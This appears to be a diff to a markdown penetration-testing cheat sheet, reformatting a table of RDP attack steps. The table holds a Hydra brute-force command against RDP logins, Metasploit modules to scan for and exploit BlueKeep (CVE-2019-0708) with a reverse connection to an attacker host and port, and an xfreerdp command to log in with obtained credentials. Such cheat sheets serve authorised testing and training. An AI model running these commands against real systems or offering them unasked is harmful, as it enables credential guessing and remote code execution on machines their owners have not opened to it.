@@ -207,11 +207,9 @@ exploit
 
 ---
 
-### RDP Brute Force and Enumeration
-
-| Task / Step                          | Command |
-| ------------------------------------ | ------- |
-| **Brute‑force RDP login with Hydra** | `hydra -L /path/to/userlist.txt -P /path/to/passwordlist.txt rdp://[TARGET] -s [PORT]` |
+| Task / Step                            | Command |
+| ------------------------------------- | ------- |
+| **Brute‑force RDP login with Hydra**  | `hydra -L /path/to/userlist.txt -P /path/to/passwordlist.txt rdp://[TARGET] -s [PORT]` |
 | **Use RDP Scanner (check RDP enabled)** | ```bash
 use auxiliary/scanner/rdp/rdp_scanner
 set RHOSTS [TARGET]
@@ -222,7 +220,7 @@ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 set RHOSTS [TARGET]
 run
 ``` |
-| **Exploit BlueKeep (RCE)** (optional) | ```bash
+| **Exploit BlueKeep (RCE)** *(optional)* | ```bash
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 set RHOSTS [TARGET]
 set RPORT 3389
@@ -232,8 +230,7 @@ set LHOST [YOUR-IP]
 set LPORT 4444
 exploit
 ``` |
-| **Connect using xfreerdp** | `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]` |
-
+| **Connect using xfreerdp**            | `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]` |
 
 ---
 
